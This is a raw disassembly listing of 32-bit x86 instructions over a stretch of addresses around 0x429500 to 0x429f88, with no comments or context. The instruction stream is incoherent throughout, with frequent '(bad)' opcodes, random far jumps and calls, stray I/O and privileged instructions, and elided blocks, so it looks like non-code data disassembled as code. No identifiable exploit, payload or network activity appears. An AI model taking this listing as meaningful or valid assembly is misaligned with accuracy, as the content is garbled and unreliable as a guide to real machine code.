  42952f:	add    ebx,DWORD PTR [ebx-0x3d676ea1]
  429535:	sbb    esp,DWORD PTR [eax]
  429537:	sub    edx,DWORD PTR [ebx+0x7f6bd792]
  42953d:	aam    0x2d
  42953f:	inc    eax
  429540:	jl     0x4294ce
  429542:	push   eax
  429543:	or     al,0xa0
  429545:	xor    cl,dl
  429547:	repnz scas eax,DWORD PTR es:[edi]
  429549:	arpl   bx,cx
  42954b:	dec    ebp
  42954c:	add    BYTE PTR [ebx],cl
  42954e:	add    dl,BYTE PTR [ebp-0x65]
  429551:	mov    WORD PTR [esi+0x32ef5285],?
  429557:	ins    DWORD PTR es:[edi],dx
  429558:	sbb    al,0xb6
  42955a:	cdq    
  42955b:	sbb    BYTE PTR [edi-0x366e115e],cl
  429561:	pop    es
  429562:	loop   0x4295ac
  429564:	call   0x45fd:0x8ce07be8
  42956b:	push   edi
  42956c:	ins    DWORD PTR es:[edi],dx
  42956d:	push   eax
  42956e:	lahf   
  42956f:	test   DWORD PTR [edi],ebp
  429571:	jns    0x429548
  429573:	ins    DWORD PTR es:[edi],dx
  429574:	sti    
  429575:	pop    edx
  429576:	push   ebx
  429577:	mov    bh,bh
  429579:	aad    0x31
  42957b:	mov    bh,0x33
  42957d:	cmp    cl,0x52
  429580:	clc    
  429581:	je     0x4295f7
  429583:	into   
  429584:	retf   0xc186
  429587:	pop    eax
  429588:	iret   
  429589:	out    dx,al
  42958a:	mov    al,ds:0x6731e977
  42958f:	adc    al,0xcd
  429591:	les    ecx,FWORD PTR [ebx+0x6a]
  429594:	sub    DWORD PTR [edx],esi
  429596:	fadd   DWORD PTR [esi-0x71]
  429599:	popa   
  42959a:	sbb    dh,BYTE PTR [edi+0x65]
  42959d:	daa    
  42959e:	push   ebp
  42959f:	jb     0x429613
  4295a1:	in     al,0x24
  4295a3:	inc    edx
  4295a4:	jmp    0xeee8:0xa5e49d11
  4295ab:	fisttp WORD PTR [edi]
  4295ad:	scas   al,BYTE PTR es:[edi]
  4295ae:	sub    al,dh
  4295b0:	ins    BYTE PTR es:[edi],dx
  4295b1:	cli    
  4295b2:	jge    0x42954b
  4295b4:	je     0x42957f
  4295b6:	mov    esi,0x809e953
  4295bb:	lea    ebx,[ebp-0x7299ccdd]
  4295c1:	popa   
  4295c2:	mov    DWORD PTR [ecx+0x78a16363],edi
  4295c8:	pop    ds
  4295c9:	mov    cl,0xd3
  4295cb:	mov    edx,0x98c83f77
  4295d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295d1:	scas   al,BYTE PTR es:[edi]
  4295d2:	movaps XMMWORD PTR [edx-0x3f490761],xmm0
  4295d9:	(bad)  
  4295da:	xor    eax,0xfe9b525
  4295df:	movhlps xmm7,xmm2
  4295e2:	mov    al,ds:0x232556f4
  4295e7:	pop    esi
  4295e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295e9:	cs push ebx
  4295eb:	add    DWORD PTR [esi],eax
  4295ed:	mul    ah
  4295ef:	call   0x9eaa:0x9dc5be77
  4295f6:	sbb    BYTE PTR [ebx],bl
  4295f8:	or     eax,0x9bc91c14
  4295fd:	mov    eax,ds:0x4e850a47
  429602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429603:	push   ss
  429604:	iret   
  429605:	(bad)  
  429606:	fistp  QWORD PTR [ebx+0x5f]
  429609:	call   0xa22d8622
  42960e:	retf   
  42960f:	sub    eax,0x0
	...
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	ds mov eax,0xba70fe16
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	mov    ah,0xa8
  42968e:	fisub  DWORD PTR [ebx]
  429690:	out    dx,al
  429691:	push   DWORD PTR [ebx+0x6dc9d7d8]
  429697:	mov    dh,0xd8
  429699:	shr    DWORD PTR fs:[ecx-0x52],0xab
  42969e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42969f:	xchg   esi,ebx
  4296a1:	dec    edi
  4296a2:	(bad)  
  4296a3:	mov    DWORD PTR [ebx-0x2d7d7be],ebp
  4296a9:	addr16 test al,0x36
  4296ac:	mov    ecx,0x439b9323
  4296b1:	jo     0x4296e7
  4296b3:	and    al,BYTE PTR [edi]
  4296b5:	repnz lods eax,DWORD PTR ds:[esi]
  4296b7:	dec    edi
  4296b8:	dec    ebp
  4296b9:	sub    BYTE PTR [ebx+0x5c],dh
  4296bc:	adc    esi,edi
  4296be:	push   ebx
  4296bf:	add    esp,edi
  4296c1:	dec    ebx
  4296c2:	inc    esp
  4296c3:	mov    ds:0x8dde1942,eax
  4296c8:	inc    eax
  4296c9:	xor    BYTE PTR [edi+ecx*8],dh
  4296cc:	or     ah,BYTE PTR [edx]
  4296ce:	jae    0x429740
  4296d0:	aaa    
  4296d1:	jbe    0x4296e7
  4296d3:	sbb    BYTE PTR [ecx+ebp*1-0x42],0xca
  4296d8:	push   ds
  4296d9:	bound  ecx,QWORD PTR [ecx-0x72]
  4296dc:	push   ecx
  4296dd:	aad    0x74
  4296df:	mov    ecx,0xe42ea047
  4296e4:	mov    ebp,0x6f019a40
  4296e9:	enter  0x32ba,0x3c
  4296ed:	dec    esp
  4296ee:	push   ecx
  4296ef:	fs test eax,0x7d683f9c
  4296f5:	inc    edi
  4296f6:	jae    0x4296c6
  4296f8:	dec    eax
  4296f9:	das    
  4296fa:	add    al,ch
  4296fc:	fst    QWORD PTR [esi+0x6f]
  4296ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429700:	inc    edi
  429701:	and    al,0x34
  429703:	mov    eax,cs
  429705:	sub    BYTE PTR [esi],cl
  429707:	shl    BYTE PTR gs:[ebx+edi*2],1
  42970b:	pop    ds
  42970c:	xor    BYTE PTR [esp+ebp*4],dl
  42970f:	xchg   edx,eax
  429710:	or     esp,ebx
  429712:	jle    0x4296e8
  429714:	shr    BYTE PTR [ebp-0x51],1
  429717:	int    0x30
  429719:	loop   0x429782
  42971b:	xchg   ebx,eax
  42971c:	jns    0x4296ef
  42971e:	rcr    DWORD PTR [ecx-0xebe8e39],cl
  429724:	dec    ebp
  429725:	and    BYTE PTR [esi+0x74],bh
  429728:	jg     0x429790
  42972a:	test   BYTE PTR [esi+0x37],0x8b
  42972e:	xchg   ecx,eax
  42972f:	jnp    0x42972b
  429731:	jp     0x429734
  429733:	and    BYTE PTR [esi+0x4],ch
  429736:	push   cs
  429737:	fwait
  429738:	inc    edi
  429739:	wbinvd 
  42973b:	sahf   
  42973c:	test   eax,0x4fadaaf3
  429741:	xchg   ecx,eax
  429742:	mov    ah,bl
  429744:	enter  0xf9de,0xe3
  429748:	jb     0x429753
  42974a:	xor    BYTE PTR [ecx+0x72],bh
  42974d:	push   es
  42974e:	mov    ecx,DWORD PTR [edi-0x4f8e690c]
  429754:	icebp  
  429755:	(bad)  
  429756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429757:	mov    dh,0xde
  429759:	fnstenv [eax-0x48]
  42975c:	adc    edi,DWORD PTR [ebp-0x26ddf323]
  429762:	mov    esi,0x8426cb74
  429767:	call   DWORD PTR [edx]
  429769:	dec    edi
  42976a:	lock or eax,0xb7ab269d
  429770:	ret    
  429771:	mov    eax,0xa050e0d2
  429776:	fdivr  DWORD PTR [esi+0x4b71f3a3]
  42977c:	and    eax,0x7cd59426
  429781:	lods   al,BYTE PTR ds:[esi]
  429782:	in     al,dx
  429783:	aas    
  429784:	jmp    0x4297a7
  429786:	pop    ds
  429787:	jmp    0x453e:0x25f26d3d
  42978e:	in     eax,dx
  42978f:	test   BYTE PTR [eax],al
	...
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	psraw  mm7,QWORD PTR [ebx]
  429803:	stos   BYTE PTR es:[edi],al
  429804:	je     0x4297c1
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	jecxz  0x429888
  42980e:	jp     0x4297e2
  429810:	adc    eax,0x95d96f9d
  429815:	mov    al,ds:0x20579b5d
  42981a:	lods   al,BYTE PTR ds:[esi]
  42981b:	test   eax,0x5db976
  429820:	out    dx,eax
  429821:	xchg   ebp,eax
  429822:	jnp    0x42985e
  429824:	std    
  429825:	mov    dh,0x5e
  429827:	pop    ds
  429828:	fstp   st(0)
  42982a:	inc    edx
  42982b:	jne    0x42983a
  42982d:	or     eax,0x46c4f8a0
  429832:	mov    esi,0x3a2d04cc
  429837:	fistp  DWORD PTR [edi]
  429839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42983a:	sub    esp,DWORD PTR [eax+0xc]
  42983d:	add    eax,0x6ef8163e
  429842:	sub    eax,0xb880458
  429847:	push   0xffffffd2
  429849:	jge    0x429837
  42984b:	shr    DWORD PTR [edx-0x14],1
  42984e:	xor    eax,0xb9b1a442
  429853:	loopne 0x42980c
  429855:	das    
  429856:	cmc    
  429857:	retf   
  429858:	dec    esp
  429859:	mov    ecx,0xbc3109d7
  42985e:	das    
  42985f:	ror    DWORD PTR ds:0xe1ab723c,0x39
  429866:	adc    eax,0x60c668c7
  42986b:	fst    QWORD PTR [edi]
  42986d:	aad    0xef
  42986f:	push   esp
  429870:	push   cs
  429871:	add    esi,DWORD PTR [edx]
  429873:	mov    dh,0x52
  429875:	popa   
  429876:	(bad)  
  429877:	push   0xfffffffe
  429879:	push   edi
  42987a:	push   ebx
  42987b:	shl    DWORD PTR [ebp+ebx*2-0x36],1
  42987f:	out    dx,al
  429880:	lock sbb ah,al
  429883:	(bad)  
  429884:	int3   
  429885:	mov    al,ds:0x3c715634
  42988a:	cmp    esi,edx
  42988c:	sub    edi,edi
  42988e:	scas   eax,DWORD PTR es:[edi]
  42988f:	bnd jmp 0x123a8acb
  429895:	mov    al,0xa4
  429897:	scas   eax,DWORD PTR es:[edi]
  429898:	aas    
  429899:	pop    ss
  42989a:	rol    BYTE PTR [eax+0x66],0x36
  42989e:	xor    eax,0xeb0cc1bf
  4298a3:	mov    ds:0xfce601f7,eax
  4298a9:	ja     0x42986c
  4298ab:	xchg   BYTE PTR [ebx-0x70f10242],cl
  4298b1:	sbb    ebp,DWORD PTR [ecx-0x6f5d54e]
  4298b7:	test   BYTE PTR [esp+edx*2-0x74ff4a67],0x55
  4298bf:	in     al,dx
  4298c0:	dec    esi
  4298c1:	jge    0x429882
  4298c3:	lock icebp 
  4298c5:	and    eax,0x8b60f7e2
  4298ca:	add    BYTE PTR [eax],dl
  4298cc:	enter  0xc5c4,0xff
  4298d0:	les    esi,FWORD PTR [eax-0x5fa4b353]
  4298d6:	and    DWORD PTR [ebp-0x66],esi
  4298d9:	push   eax
  4298da:	sbb    BYTE PTR [edi-0x19a2cfbb],ch
  4298e0:	and    al,0x4c
  4298e3:	add    ch,BYTE PTR [ebx+edx*2]
  4298e6:	inc    ebp
  4298e7:	dec    eax
  4298e8:	ds jmp 0xb993:0xe8f84cbf
  4298f0:	or     al,0xdc
  4298f2:	fstp   TBYTE PTR [edx-0xa]
  4298f5:	je     0x429937
  4298f7:	cli    
  4298f8:	mov    al,dl
  4298fa:	or     al,0xb8
  4298fc:	jl     0x4298b2
  4298fe:	pop    es
  4298ff:	jae    0x42993f
  429901:	mov    dl,0x1d
  429903:	dec    esp
  429904:	pop    ebp
  429905:	sub    BYTE PTR [ecx+0x6e047643],ch
  42990b:	or     esi,0x646b6a
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	inc    esp
  429981:	jmp    0xbcbb10fc
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	dec    edi
  42998d:	fdiv   QWORD PTR [ebp-0x66]
  429990:	loopne 0x429958
  429992:	inc    ebp
  429993:	and    eax,DWORD PTR [esi]
  429995:	cmp    eax,0x53bb03f6
  42999a:	jnp    0x429982
  42999c:	inc    esi
  42999d:	(bad)  
  42999e:	sbb    ebx,DWORD PTR [eax+0x1a]
  4299a1:	cmp    al,0xe4
  4299a3:	aam    0xd
  4299a5:	pushf  
  4299a6:	into   
  4299a7:	mov    BYTE PTR [eax+0x2b857e20],ah
  4299ad:	cmc    
  4299ae:	adc    al,cl
  4299b0:	xchg   edi,eax
  4299b1:	push   0xffffffd2
  4299b3:	jb     0x429a22
  4299b5:	loopne 0x429945
  4299b7:	(bad)  
  4299b8:	fsub   DWORD PTR [ebx]
  4299ba:	cmp    BYTE PTR [edi+ebx*8-0x60],ah
  4299be:	test   al,0x64
  4299c0:	and    ecx,ebp
  4299c2:	sbb    ebx,DWORD PTR [ebp-0x736d1a57]
  4299c8:	cld    
  4299c9:	cmp    ebp,edx
  4299cb:	push   ecx
  4299cc:	pop    ebx
  4299cd:	cmp    ebp,eax
  4299cf:	imul   ebp,DWORD PTR [edi+0xd],0x9b8de125
  4299d6:	jge    0x429996
  4299d8:	je     0x429a59
  4299da:	shl    edi,cl
  4299dc:	stos   DWORD PTR es:[edi],eax
  4299dd:	jge    0x4299a6
  4299df:	ret    
  4299e0:	scas   eax,DWORD PTR es:[edi]
  4299e1:	jo     0x4299a1
  4299e3:	je     0x4299b2
  4299e5:	xchg   edx,eax
  4299e6:	(bad)  
  4299e7:	jb     0x429a07
  4299e9:	push   ebp
  4299ea:	ins    BYTE PTR es:[edi],dx
  4299eb:	leave  
  4299ec:	jmp    0x4299ba
  4299ee:	(bad)  
  4299ef:	cmp    ah,bh
  4299f1:	repnz pop edi
  4299f3:	sub    edx,0x3875ec06
  4299f9:	dec    ebp
  4299fa:	jo     0x4299fc
  4299fc:	inc    ebx
  4299fd:	sub    eax,0x2d88f770
  429a02:	inc    ecx
  429a03:	mov    ch,0x19
  429a05:	enter  0xc27c,0x58
  429a09:	pop    ebx
  429a0a:	mov    al,ch
  429a0c:	jmp    0x70230da1
  429a11:	jno    0x4299b7
  429a13:	cmp    eax,0xa9df6a4d
  429a18:	cld    
  429a19:	lods   eax,DWORD PTR ds:[esi]
  429a1a:	ss push ss
  429a1c:	mov    edi,0x38504b42
  429a21:	hlt    
  429a22:	jge    0x4299cb
  429a24:	lock clc 
  429a26:	inc    ecx
  429a27:	jnp    0x429a9b
  429a29:	in     al,dx
  429a2a:	out    dx,eax
  429a2b:	mov    ebx,eax
  429a2d:	mov    ebp,0x60d31777
  429a32:	inc    ecx
  429a33:	cmp    eax,0xa0c2c7b4
  429a38:	mov    WORD PTR [ecx],gs
  429a3a:	fs (bad) 
  429a3d:	lea    esp,[ebp-0x46]
  429a40:	push   edx
  429a41:	loope  0x429a30
  429a43:	sub    al,0x72
  429a45:	ja     0x429a01
  429a47:	add    al,0xc6
  429a49:	jno    0x429a80
  429a4b:	cs pop ds
  429a4d:	adc    cl,bh
  429a4f:	je     0x429a84
  429a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a52:	jecxz  0x4299f4
  429a54:	in     al,0xb6
  429a56:	outs   dx,DWORD PTR ds:[esi]
  429a57:	or     dh,ch
  429a59:	rcl    ch,0x83
  429a5c:	mov    eax,ds:0x638f1b56
  429a61:	loopne 0x4299f3
  429a63:	retf   0xaf5a
  429a66:	adc    eax,0x35bf466a
  429a6b:	adc    dh,BYTE PTR [eax+0x35]
  429a6e:	jbe    0x429a26
  429a70:	adc    eax,0x6b99e4b1
  429a75:	jg     0x429a9c
  429a77:	pop    edi
  429a78:	(bad)  
  429a79:	icebp  
  429a7a:	xor    BYTE PTR [ebx+0x167fcb71],ah
  429a80:	lahf   
  429a81:	out    0x9,eax
  429a83:	xchg   BYTE PTR [esi+0x4f],cl
  429a86:	lods   eax,DWORD PTR ds:[esi]
  429a87:	inc    ebx
  429a88:	outs   dx,BYTE PTR ds:[esi]
  429a89:	cld    
  429a8a:	loop   0x429a9c
  429a8c:	neg    cl
  429a8e:	addr16 sbb al,0x0
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x1fa95667
  429b01:	lock fucomi st,st(1)
  429b04:	jl     0x429ac3
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    al,0x1
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	mov    eax,ds:0xe3feaa5d
  429b11:	xchg   edi,eax
  429b12:	lock scas al,BYTE PTR es:[edi]
  429b14:	repnz xchg esp,eax
  429b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b17:	sbb    DWORD PTR [esi+0x4],eax
  429b1a:	out    dx,al
  429b1b:	add    ebx,DWORD PTR [eax]
  429b1d:	fild   WORD PTR [ecx-0x4]
  429b20:	gs call 0xc0f:0xbe8212fe
  429b28:	pop    ds
  429b29:	or     BYTE PTR [ebx+0x2f],dh
  429b2c:	xchg   edx,eax
  429b2d:	jo     0x429b56
  429b2f:	add    ecx,DWORD PTR [edi-0x68]
  429b32:	into   
  429b33:	sbb    BYTE PTR [ebx-0x29d575e1],0x2f
  429b3a:	std    
  429b3b:	cmp    DWORD PTR [edx+0x28],0xffffff8a
  429b3f:	xchg   edi,eax
  429b40:	fdiv   DWORD PTR [edi+edx*1]
  429b43:	dec    eax
  429b44:	test   DWORD PTR [edi],edi
  429b46:	stos   BYTE PTR es:[edi],al
  429b47:	les    ebx,FWORD PTR [edx]
  429b49:	aad    0x6f
  429b4b:	xchg   ebp,eax
  429b4c:	js     0x429b11
  429b4e:	and    BYTE PTR [esi-0x56],al
  429b51:	add    ah,BYTE PTR ds:0x3597dc06
  429b57:	lods   eax,DWORD PTR ds:[esi]
  429b58:	inc    ebp
  429b59:	loop   0x429aff
  429b5b:	jnp    0x429ba5
  429b5d:	xor    al,0x35
  429b5f:	inc    eax
  429b60:	mov    dl,0xfb
  429b62:	in     al,dx
  429b63:	cmp    DWORD PTR [esi-0x3f],eax
  429b66:	shl    BYTE PTR [eax],0x75
  429b69:	adc    DWORD PTR [ecx+0x56fd9cc5],esp
  429b6f:	cs cmp eax,0x8e12d390
  429b75:	fwait
  429b76:	pop    esi
  429b77:	or     eax,0xd6900eeb
  429b7c:	pushf  
  429b7d:	sbb    bh,BYTE PTR [eax-0x666caa0]
  429b83:	scas   al,BYTE PTR es:[edi]
  429b84:	fidiv  WORD PTR [ebx]
  429b86:	xchg   ebp,eax
  429b87:	xchg   esi,eax
  429b88:	ret    
  429b89:	(bad)  
  429b8a:	sbb    BYTE PTR [ebp-0x6d62501a],cl
  429b90:	ins    DWORD PTR es:[edi],dx
  429b91:	mov    cl,0xd3
  429b93:	das    
  429b94:	push   0xffffffe0
  429b96:	cmp    BYTE PTR [eax+0x71],al
  429b99:	imul   ecx,ebp,0x4fe0c6bb
  429b9f:	add    bl,bh
  429ba1:	xor    BYTE PTR [edx],dh
  429ba3:	mov    ebp,0xf1e10e9d
  429ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ba9:	repnz cdq 
  429bab:	stc    
  429bac:	jle    0x429c02
  429bae:	sub    eax,0xc8267271
  429bb3:	adc    eax,0xee6e3b21
  429bb8:	das    
  429bb9:	ret    
  429bba:	int    0xf9
  429bbc:	sub    DWORD PTR [edx],eax
  429bbe:	test   eax,0x3dad98ff
  429bc3:	lahf   
  429bc4:	and    ebx,DWORD PTR [eax]
  429bc6:	out    dx,eax
  429bc7:	mov    edi,ds
  429bc9:	jl     0x429bb0
  429bcb:	xchg   eax,esp
  429bcd:	jmp    0x1e6e471
  429bd2:	sar    BYTE PTR [edi+0x74acd8e3],cl
  429bd8:	dec    bp
  429bda:	fisttp QWORD PTR [ebp+0x2c]
  429bdd:	sub    eax,0x84d266d6
  429be2:	addr16 (bad) 
  429be4:	adc    dh,dh
  429be6:	lahf   
  429be7:	ret    
  429be8:	call   0x2ed:0xe47ce91
  429bef:	mov    cl,BYTE PTR [edi]
  429bf1:	scas   al,BYTE PTR es:[edi]
  429bf2:	out    dx,eax
  429bf3:	adc    al,0x13
  429bf5:	push   ebx
  429bf6:	sti    
  429bf7:	addr16 jmp 0xf05d:0xe4a35c35
  429bff:	jnp    0x429b9f
  429c01:	jnp    0x429c49
  429c03:	enter  0xeffa,0xca
  429c07:	xchg   DWORD PTR ds:0x5a8b961a,ecx
  429c0d:	mov    BYTE PTR [edx-0x74],dh
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    bl,bl
  429c81:	sbb    ah,ch
  429c83:	cmp    BYTE PTR gs:[esi+0x1040001],0x0
  429c8b:	add    BYTE PTR [edi+0x7953abef],cl
  429c91:	adc    al,0x1c
  429c93:	mov    al,0x25
  429c95:	jmp    0x429d0f
  429c97:	out    0x3f,eax
  429c99:	adc    eax,0x5a6dec3f
  429c9e:	jbe    0x429c2d
  429ca0:	shr    BYTE PTR [ecx],0x7c
  429ca3:	icebp  
  429ca4:	jmp    0x429c7d
  429ca6:	add    esp,DWORD PTR [ebx*8-0x6acb3a75]
  429cad:	shl    BYTE PTR [edx],cl
  429caf:	test   dl,al
  429cb1:	addr16 adc dh,dh
  429cb4:	sahf   
  429cb5:	sbb    BYTE PTR [eax-0x3ee12215],bl
  429cbb:	cdq    
  429cbc:	rcr    BYTE PTR [esi+ebx*2],1
  429cbf:	sub    ecx,esi
  429cc1:	cmp    BYTE PTR [ecx],bh
  429cc3:	xor    ebx,DWORD PTR [ebx-0x7896304c]
  429cc9:	bound  ebp,QWORD PTR [ebx-0x53]
  429ccc:	mov    eax,0x3e07c22e
  429cd1:	push   es
  429cd2:	dec    edi
  429cd3:	sbb    al,0x41
  429cd5:	imul   edi,DWORD PTR [ebx],0xe738dc17
  429cdb:	pop    ebx
  429cdc:	fs mov ch,0x34
  429cdf:	sbb    BYTE PTR [eax+0x509981b4],0x64
  429ce6:	dec    ecx
  429ce7:	mov    bh,0xf6
  429ce9:	cmp    eax,0x2051fe01
  429cee:	inc    eax
  429cef:	iret   
  429cf0:	scas   al,BYTE PTR es:[edi]
  429cf1:	xor    dh,BYTE PTR [eax+0x76798bb5]
  429cf7:	fadd   DWORD PTR [ebx]
  429cf9:	xor    ah,BYTE PTR es:[edx+0x45ed5edd]
  429d00:	shr    esp,0x91
  429d03:	int    0x14
  429d05:	mov    eax,0xfcaf5f65
  429d0a:	fs mov ebp,0xe080c0f7
  429d10:	(bad)
  429d14:	mov    bh,0x93
  429d16:	into   
  429d17:	add    BYTE PTR [edx],ah
  429d19:	outs   dx,DWORD PTR ds:[esi]
  429d1a:	ret    
  429d1b:	xchg   BYTE PTR [edx+0x34],ah
  429d1e:	add    esp,DWORD PTR [edx+ecx*2]
  429d21:	mov    BYTE PTR [ecx-0x798e9ede],dl
  429d27:	les    ecx,FWORD PTR [ebp-0x75e835e8]
  429d2d:	jecxz  0x429cc5
  429d2f:	and    eax,DWORD PTR [edx+0x39491a64]
  429d35:	mov    eax,0xb28e3d7e
  429d3a:	mov    ebp,0xe631d23b
  429d3f:	xchg   edx,eax
  429d40:	test   BYTE PTR [ebx+ebx*2],bl
  429d43:	sbb    ecx,DWORD PTR [edi]
  429d45:	mov    eax,ds:0xe59741e5
  429d4a:	pop    ecx
  429d4b:	call   0xe3e:0xcf8a0e2c
  429d52:	sar    bh,1
  429d54:	mov    esi,0x84ab3271
  429d59:	(bad)  
  429d5a:	retf   0x647e
  429d5d:	mov    bh,0xe1
  429d5f:	sbb    al,0xbb
  429d61:	lods   al,BYTE PTR ds:[esi]
  429d62:	hlt    
  429d63:	jns    0x429d2e
  429d65:	aaa    
  429d66:	cmc    
  429d67:	jge    0x429cf7
  429d69:	push   es
  429d6a:	xor    DWORD PTR [edx],esp
  429d6c:	pop    es
  429d6d:	pop    ecx
  429d6e:	mov    eax,0xed4aaa
  429d73:	mov    cl,0xa8
  429d75:	push   DWORD PTR [edx]
  429d77:	inc    eax
  429d78:	add    eax,0xb04541d3
  429d7d:	bound  edi,QWORD PTR [ebx-0x3d]
  429d80:	or     eax,0x406ed838
  429d85:	cwde   
  429d86:	xchg   esp,eax
  429d87:	adc    eax,0x5aae455c
  429d8c:	mov    es,WORD PTR [ebx+0xaabe]
	...
  429df2:	add    BYTE PTR [eax],al
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	out    dx,eax
  429e01:	shl    DWORD PTR [esi+0x1bf844b],1
  429e07:	add    BYTE PTR [ecx+eax*1],al
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	repz dec ebp
  429e0e:	mov    esi,0x6147f73
  429e13:	fstp   DWORD PTR [edi+0xc4dd9a1]
  429e19:	pusha  
  429e1a:	pop    esi
  429e1b:	(bad)  
  429e1c:	in     al,dx
  429e1d:	add    BYTE PTR [esi-0x34097b7d],cl
  429e23:	inc    ebx
  429e24:	dec    ecx
  429e25:	xchg   esp,eax
  429e26:	jne    0x429e70
  429e28:	icebp  
  429e29:	add    al,0x2f
  429e2b:	dec    ebp
  429e2c:	push   ebx
  429e2d:	pushf  
  429e2e:	ret    
  429e2f:	jmp    0xac4e:0x7836b1fe
  429e36:	popa   
  429e37:	test   ch,0x44
  429e3a:	mov    esp,ecx
  429e3c:	outs   dx,BYTE PTR ds:[esi]
  429e3d:	cmp    BYTE PTR [eax],dl
  429e3f:	sbb    al,al
  429e41:	cwde   
  429e42:	loop   0x429dd0
  429e44:	jp     0x429e38
  429e46:	xor    DWORD PTR [eax+edi*8-0x4c],eax
  429e4a:	adc    ebx,DWORD PTR [edx-0x1e]
  429e4d:	sub    BYTE PTR [eax+0x163fb3ef],0xe8
  429e54:	shl    DWORD PTR ds:0x3d4f48b0,cl
  429e5a:	mov    dl,0xc1
  429e5c:	dec    eax
  429e5d:	lods   al,BYTE PTR ds:[esi]
  429e5e:	adc    BYTE PTR [edx+0x6636d8a9],bl
  429e64:	sub    ah,ch
  429e66:	mov    ebp,0x99147f9
  429e6b:	mov    ebx,0xb2d34831
  429e70:	loopne 0x429e45
  429e72:	and    ebx,esp
  429e74:	pop    edx
  429e75:	adc    eax,0x3ca368af
  429e7a:	(bad)  
  429e7b:	dec    esp
  429e7c:	sar    ch,1
  429e7e:	in     al,0x6b
  429e80:	test   eax,0x9ab629f8
  429e85:	mov    esi,0x58d11625
  429e8a:	add    BYTE PTR [ebp+0x39],cl
  429e8d:	and    DWORD PTR [edi-0x5fca9ffe],edx
  429e93:	mov    bh,0x39
  429e95:	fld    TBYTE PTR [ecx-0x781128cd]
  429e9b:	jecxz  0x429e23
  429e9d:	stos   BYTE PTR es:[edi],al
  429e9e:	mov    ds:0x1da14c3f,eax
  429ea3:	les    edi,FWORD PTR [edi+0x5d]
  429ea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ea7:	pop    esp
  429ea8:	xchg   ecx,eax
  429ea9:	push   ds
  429eaa:	int3   
  429eab:	mov    edx,ebp
  429ead:	jl     0x429e91
  429eaf:	push   0xffffff9d
  429eb1:	ins    DWORD PTR es:[edi],dx
  429eb2:	ffree  st(1)
  429eb4:	mov    edx,0xb0571b56
  429eb9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ebb:	pushf  
  429ebc:	into   
  429ebd:	xor    DWORD PTR [eax+0x5942f2a4],ecx
  429ec3:	and    al,0x35
  429ec5:	out    0xbb,eax
  429ec7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  429ec9:	lock adc DWORD PTR [edx+0x22],esi
  429ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ece:	jp     0x429ed7
  429ed0:	cmp    ah,dl
  429ed2:	jle    0x429e6f
  429ed4:	sub    esp,DWORD PTR [ecx+0x52]
  429ed7:	dec    ebx
  429ed8:	add    BYTE PTR [edx],ch
  429eda:	xlat   BYTE PTR ds:[ebx]
  429edb:	inc    esp
  429edc:	lahf   
  429edd:	jb     0x429f3e
  429edf:	sub    al,ch
  429ee1:	pop    eax
  429ee2:	call   0x55cf7f4e
  429ee7:	or     ch,bh
  429ee9:	out    dx,eax
  429eea:	add    BYTE PTR [ecx],dl
  429eec:	add    DWORD PTR [esi-0x71],0x11
  429ef0:	lods   eax,DWORD PTR ds:[esi]
  429ef1:	adc    al,0x21
  429ef3:	mov    al,0x54
  429ef5:	das    
  429ef6:	push   cs
  429ef7:	xchg   ecx,eax
  429ef8:	and    BYTE PTR [eax+eiz*2+0x6],cl
  429efc:	or     BYTE PTR [eax+0x3ccd8c8b],ch
  429f02:	enter  0x9a86,0x7
  429f06:	push   ebx
  429f07:	icebp  
  429f08:	rol    BYTE PTR [eax],0x4
  429f0b:	cmp    ecx,DWORD PTR [edx]
  429f0d:	ror    dh,0xa1
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x447fa32e]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
